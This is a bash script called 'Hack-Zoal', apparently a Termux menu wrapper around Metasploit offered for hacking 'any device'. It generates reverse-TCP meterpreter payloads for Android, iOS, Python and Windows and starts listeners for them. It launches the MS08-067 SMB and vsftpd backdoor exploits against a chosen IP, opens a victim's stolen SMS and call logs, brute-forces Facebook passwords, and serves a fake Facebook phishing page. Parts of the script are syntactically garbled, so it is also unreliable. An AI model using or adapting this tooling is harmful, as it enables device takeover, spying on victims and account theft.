Hack-Zoal.sh

#!/bin/bash
clear
red='\e[1;31m'
green='\e[1;32m' 
blue='\e[1;34m' 
purple='\e[1;35m'
cyan='\e[1;36m' 
white='\e[1;37m'
yellow='\e[1;33m'
                      #Code: By Abody_mustapha/Saeed_Ahmeed
echo -e 
$green'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $red '                   ......\..\'
echo -e $red '                ._..-....`\..\'
echo -e $red '                  -._; .;.`-...'
echo -e $red '                  `~-.;..........'
echo -e $red '    Hack-Zoal    --,`..............'
echo -e $red '                       -=...........;'
echo -e $red '             .--=~~=-,    -.;........;'
echo -e $red '              .-=`;....`~,_.;........./'
echo -e $red '              `  ,-`......-;..........|'
echo -e $red '                 .-~`......;.........;'
echo -e $red '                  .;.-....-;.........,\'
echo -e $white '                  `.....,=;......-...`~.-._'
echo -e $white '                 . ;.....;................-.'
echo -e $white '                    .\..;..;........,..._..a  ,'
echo -e $white '                    . ~";-`...;......;"~` ` -=.)'
echo -e $white '                 .........._;..;.,..;'
echo -e $white '                  -.._`~`....\..;.;.:'
echo -e $white '                     `~.......\\_ \\_'
echo -e $white '                           /=`^^=`""/`)-.'
echo -e $white '                           \ =....=.....=\'
echo -e $white '       CopyRights Zoal      `""` `~-. =...;'
echo -e $white '  www.fb.com/saeedshabt201@gmail.com'
echo ""
echo -e $green 
"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

echo ""
echo -e $yellow 'welcome in Hack-Zoal 2019 U can Hack any Device with me '
echo ""
echo -e $green '{-1-}' $blue 'Create Payload'
echo ""
echo -e $green '{-2-}' $blue 'Hack Devices'
echo ""
echo -e $green '{-3-}' $blue 'metasploit'
echo ""
echo -e $green '{-4-}' $blue 'FaceBook'
echo ""
echo -e $green '{-0-}' $red 'exit [0]'

echo ""
echo -e $white "insert the number "

read -p "insert num :>" menu 

if [ $menu = 1 ]
then
clear 
echo -e 
$green'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $red '                   ......\..\'
echo -e $red '                ._..-....`\..\'
echo -e $red '                  -._; .;.`-...'
echo -e $red '                  `~-.;..........'
echo -e $red '    Hack-Zoal     --,`..............'
echo -e $red '                       -=...........;'
echo -e $red '             .--=~~=-,    -.;........;'
echo -e $red '              .-=`;....`~,_.;........./'
echo -e $red '              `  ,-`......-;..........|'
echo -e $red '                 .-~`......;.........;'
echo -e $red '                  .;.-....-;.........,\'
echo -e $white '                  `.....,=;......-...`~.-._'
echo -e $white '                  . ;.....;................-.'
echo -e $white '                     .\..;..;........,..._..a ,'
echo -e $white '                    . ~";-`...;......;"~` ` -=.)'
echo -e $white '                 .........._;..;.,..;'
echo -e $white '                  -.._`~`....\..;.;.:'
echo -e $white '                     `~.......\\_ \\_'
echo -e $white '                           /=`^^=`""/`)-.'
echo -e $white '                           \ =....=.....=\'
echo -e $white '       CopyRights Zoal      `""` `~-. =...;'
echo -e $white '    www.fb.com/saeedshabt201@gmail.com'
echo ""
echo -e $green 
'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'

echo ""
echo -e $red 'welcome in Hack-Zoal 2019 U can Hack any Device with me '
echo ""
echo -e $green '{-1-}' $red '--payload apk --'
echo ""
echo -e $yellow '{-2-}' $red '--payload python --'
echo ""
echo -e $red '{-3-}' $red '--payload ios --'
echo ""
echo -e $green '{-4-}' $red '--payload exe --'
echo ""
echo -e $red '{-00-}' $red '--back [00]'

echo ""
echo -e $white "insert the number "

read -p "insert :>" payload
if [ $payload = 1 ]
then 
echo -e $red " please insert LHOST :>"
read -p "insert LHOST" lhost
echo -e $red " please insert port :>"
read -p "insert port" lport
echo -e $red " please insert Name payload :>"
read -p "insert name" name
echo -e $red " please insert path :>"
read -p "insert PATH" path
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.apk

fi
if [ $payload = 2 ]
then 

echo -e $red " please insert LHOST :>"
read -p "insert LHOST" lhost
echo -e $red " please insert port :>"
read -p "insert port" lport
echo -e $red " please insert Name payload :>"
read -p "insert name" name
echo -e $red " please insert path :>"
read -p "insert PATH" path
msfvenom -f raw -p python/meterpreter/reverse_tcp/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.py

fi
if [ $payload = 3 ]
then 
echo -e $red " please insert LHOST :>"
read -p "insert LHOST" lhost
echo -e $red " please insert port :>"
read -p "insert port" lport
echo -e $red " please insert Name payload :>"
read -p "insert name" name
echo -e $red " please insert path :>"
read -p "insert PATH" path
msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.api

fi
if [ $payload = 4 ]
then 

echo -e $red " please insert LHOST :>"
read -p "insert LHOST" lhost
echo -e $red " please insert port :>"
read -p "insert port" lport
echo -e $red " please insert Name payload :>"
read -p "insert name" name
echo -e $red " please insert path :>"
read -p "insert PATH" path
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $path/$name.apk
bash Hack-Zoal.sh
fi
if [ $payload = 00 ]
then
clear

fi
fi

if [ $menu = 2 ]
then
clear 


echo -e 
$green'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $red '                   ......\..\'
echo -e $red '                ._..-....`\..\'
echo -e $red '                  -._; .;.`-...'
echo -e $red '                  `~-.;..........'
echo -e $red '    Hack-Zoal     --,`..............'
echo -e $red '                       -=...........;'
echo -e $red '             .--=~~=-,    -.;........;'
echo -e $red '              .-=`;....`~,_.;........./'
echo -e $red '              `  ,-`......-;..........|'
echo -e $red '                 .-~`......;.........;'
echo -e $red '                  .;.-....-;.........,\'
echo -e $white '                  `.....,=;......-...`~.-._'
echo -e $white '                  . ;.....;................-.'
echo -e $white '                     .\..;..;........,..._..a ,'
echo -e $white '                    . ~";-`...;......;"~` ` -=.)'
echo -e $white '                 .........._;..;.,..;'
echo -e $white '                  -.._`~`....\..;.;.:'
echo -e $white '                     `~.......\\_ \\_'
echo -e $white '                           /=`^^=`""/`)-.'
echo -e $white '                           \ =....=.....=\'
echo -e $white '       CopyRights Zoal      `""` `~-. =...;'
echo -e $white '    www.fb.com/saeedshabt201@gmail.com'
echo ""
echo -e $green 
'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'

echo ""
echo -e $red 'welcome in Hack-Zoal 2019 U can Hack any Device with me '
echo ""
echo -e $red "Please Insert Payload Type "
read -p "insert payload type :>" type
if [ $type = "apk" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert LPORT :>" port
msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set 
LPORT '$port -x 'exploit'

fi 
if [ $type = "py" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert LPORT :>" port
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'

fi 
if [ $type = "ios" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert LPORT :>" port
msfconsole -x 'use multi/handler' -x 'set payload iphone/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
fi 
if [ $type = "exe" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert LPORT :>" port
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
fi 
fi

if [ $menu = 3 ]
then
clear
echo -e
$green'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $red '                   ......\..\'
echo -e $red '                ._..-....`\..\'
echo -e $red '                  -._; .;.`-...'
echo -e $red '                  `~-.;..........'
echo -e $red '    Hack-Zoal     --,`..............'
echo -e $red '                       -=...........;'
echo -e $red '             .--=~~=-,    -.;........;'
echo -e $red '              .-=`;....`~,_.;........./'
echo -e $red '              `  ,-`......-;..........|'
echo -e $red '                 .-~`......;.........;'
echo -e $red '                  .;.-....-;.........,\'
echo -e $white '                  `.....,=;......-...`~.-._'
echo -e $white '                  . ;.....;................-.'
echo -e $white '                     .\..;..;........,..._..a ,'
echo -e $white '                    . ~";-`...;......;"~` ` -=.)'
echo -e $white '                 .........._;..;.,..;'
echo -e $white '                  -.._`~`....\..;.;.:'
echo -e $white '                     `~.......\\_ \\_'
echo -e $white '                           /=`^^=`""/`)-.'
echo -e $white '                           \ =....=.....=\'
echo -e $white '       CopyRights Zoal      `""` `~-. =...;'
echo -e $white '    www.fb.com/saeedshabt201@gmail.com'
echo ""
echo -e $green
'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $red 'welcome in Hack-Zoal 2019 U can Hack any Device with me '
echo ""
echo -e "$cyan"
echo "            [1]payload android "
echo "            [2]payload windows "
echo "            [3]Android penetration msf "
echo "            [4]windows penetration msf "
echo "            [5]Breakthrough via Port (21)"
echo "            [6]Breakthrough via Port (445)"
echo "            [7]open (sms,calllog,....txt) The victim "
echo "            [8]Open the victim files that you downloaded "
echo "            [9]Download msf "
echo "            [10]error metasploit "
echo "            [11]Download msf (5.0.0)"
echo -e "$green"
read -p "     number------->  " Zoal
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
if [ $Zoal = 1 ] 
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert LPORT :>" port
msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' 
-x 'set LHOST '$host -x 'set 
LPORT '$port -x 'exploit'
fi 
if [ $Zoal = 2 ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert LPORT :>" port
msfconsole -x 'use exploit/multi/handler' -x 'set payload 
windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 
'exploit'
fi
if [ $Zoal = 3 ]
then
echo -e "$cyan"
read -p "                  ip----->" ip
read -p "                    port---->" port
cd $HOME/Hack-Zoal/.msf
echo "use exploit/multi/handler" > .msf.rc
echo "set payload android/meterpreter/reverse_tcp" >> .msf.rc
echo "set lhost $ip" >> .msf.rc
echo "set lport $port" >> .msf.rc
echo "exploit" >> .msf.rc
msfconsole -r .msf.rc
fi
if [ $Zoal = 4 ]
then
echo -e "$red"
read -p "                  ip----->" ip
read -p "                    port---->" port
cd $HOME/Hack-Zoal/.msf
echo "use exploit/multi/handler" > .msf1.rc
echo "set payloads windows/meterpreter/reverse_tcp" >> .msf1.rc
echo "set lhost $ip" >> .msf1.rc
echo "set lport $port" >> .msf1.rc
echo "exploit" >> .msf1.rc
msfconsole -r .msf1.rc
fi
if [ $Zoal = 5 ]
then
echo -e "$cyan"
read -p "                  ip----->" ip
cd $HOME/Hack-Zoal/.msf
echo "use exploit/unix/ftp/vsftpd_234_backdoor" > .3msf.rc
echo "set payload cmd/unix/interact" >> .3msf.$
echo "set RHOST $ip" >> .3msf.rc
echo "set RPORT 21" >> .3msf.rc
echo "exploit" >> .3msf.rc
msfconsole -r .3msf.rc
fi
if [ $Zoal = 6 ]
then
echo -e "$cyan"
read -p "                  ip----->" ip
cd $HOME/Hack-Zoal/.msf
echo "use windows/smb/ms08_067_netapi" > .4msf.rc
echo "set payload windows/meterpreter/bind_tcp" >> .4msf.rc
echo "set RHOST $ip" >> .4msf.rc
echo "set RPORT 445" >> .4msf.rc
echo "exploit" >> .4msf.rc
msfconsole -r .4msf.rc
fi
if [ $Zoal = 7 ]
then
echo -e "$red"
echo "                                 [0]back"
echo -e "$green    "
cd $HOME/Hack-Zoal/.msf && ls
echo ""
read -p "name.txt ------> " n
if [ "$n" -eq "0"  ]; then
cd $HOME/Hack-Zoal
Hack-Zoal.sh
else
termux-open $n
fi
if [$Zoal = 8 ]
then
echo -e "$red"
echo "                                 [0]back"
echo -e "$green    "
cd $HOME/Hack-Zoal/.msf && ls
echo ""
read -p "name photo ------> " n
echo -e "$green"
if [ "$n" -eq "0"  ]; then
cd $HOME/Hack-Zoal
Hack-Zoal.sh
else
termux-open $n
echo "                                   good Bye"
fi
 
if [ $Zoal = 9 ]
then
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
cd
git clone https://Auxilus.github.io/metasploit.sh
bundle install
clear
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
gem install crass -v '1.0.4' --source 'https://rubygems.org/'
cd
cd metasploit-framework
bundle update nokogiri
echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
fi
if [ $Zoal = 10 ]
then
echo -e "++++++++++++++++> please wait <++++++++++++++++"
cd .msf
chmod +x *
sh .error.sh
fi

if [ $Zoal = 11 ]
then
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
cd
git clone https://github.com/rapid7/metasploit-framework
bundle install
clear
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
gem install crass -v '1.0.4' --source 'https://rubygems.org/'
cd
cd metasploit-framework
bundle update nokogiri
echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
fi
else clear
echo -e "$red"
figlet -f big "ERROR"
Hack-Zoal.sh
fi
fi
if [ $menu = 4 ]
then
clear
echo -e
$green'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $red '                   ......\..\'
echo -e $red '                ._..-....`\..\'
echo -e $red '                  -._; .;.`-...'
echo -e $red '                  `~-.;..........'
echo -e $red '    Hack-Zoal    --,`..............'
echo -e $red '                       -=...........;'
echo -e $red '             .--=~~=-,    -.;........;'
echo -e $red '              .-=`;....`~,_.;........./'
echo -e $red '              `  ,-`......-;..........|'
echo -e $red '                 .-~`......;.........;'
echo -e $red '                  .;.-....-;.........,\'
echo -e $white '                  `.....,=;......-...`~.-._'
echo -e $white '                 . ;.....;................-.'
echo -e $white '                    .\..;..;........,..._..a  ,'
echo -e $white '                    . ~";-`...;......;"~` ` -=.)'
echo -e $white '                 .........._;..;.,..;'
echo -e $white '                  -.._`~`....\..;.;.:'
echo -e $white '                     `~.......\\_ \\_'
echo -e $white '                           /=`^^=`""/`)-.'
echo -e $white '                           \ =....=.....=\'
echo -e $white '       CopyRights Zoal      `""` `~-. =...;'
echo -e $white '    www.fb.com/saeedshabt201@gmail.com'
echo ""
echo -e $green
'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $red 'welcome in Hack-Zoal 2019 U can Hack any Device with me '
echo ""
echo -e "$purple"
echo "         [1]Guess facebook"
echo "         [2]Available facebook"
echo "         [3]A fake page for Facebook"
echo -e "$green"
read -p "     number------->  " Zoal
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
fi
if [ $Zoal = 1 ]
then
echo -e "  $red         [1]add password        [0]back"
echo ""
echo -e " $green      id = E-mail "
echo "               password = password.txt "
read -p "            entat   " Zoal
if [ $Zoal = 1 ] 
then
nano $HOME/Hack-Zoal/.facebook/password.txt
Hack-Zoal.sh
fi
elif [ $Zoal = 0 ]
then
Hack-Zoal.sh
else
pkg install python2
pip2 install mechanize
clear
sh $HOME/Hack-Zoal/.cxcxcx.sh
echo -e " $yellow                 password = password.txt"
echo -e "$green"
cd $HOME/Hack-Zoal/.facebook
python2 $HOME/Hack-Zoal/.facebook/facebook.py
sleep 1000000

fi
if [ $Zoal = 2 ]
then
clear
cd
pip2 install mechanize
cd $HOME/payload5/.max
clear
python2 op.py
fi
if [ $Zoal = 3 ]
then
cd
rm $HOME/Hack-Zoal/.weeman/core/shell.py
rm $HOME/Hack-Zoal/.weeman/core/shell.pyc
cd $HOME/Hack-Zoal
clear
chmod +x .bvbv.sh
sh .bvbv.sh
echo -e "$green"
echo -e "=================>{$blue facebook$green }<==============="
echo -e "$cyan                    set url "
echo -e "$cyan                 set action_url "
read -p "    entar " Zoal
fi
elesf [ $Zoal = 0 ]
'then'
'else'
'cp $HOME/Hack-Zoal/.Zoal/shellf.py $HOME/Hack-Zoal/.weeman/core/shell.py'
'cd $HOME/Hack-Zoal/.weeman/'
'python2 weeman.py'
fi
if [ $menu = 0 ]
then
clear
figlet -f mono12.tlf "Good Bye"
exit
fi
#Thanks My Bro Abody_Mustapha and I very lotof becuse i know relly man eq.. U
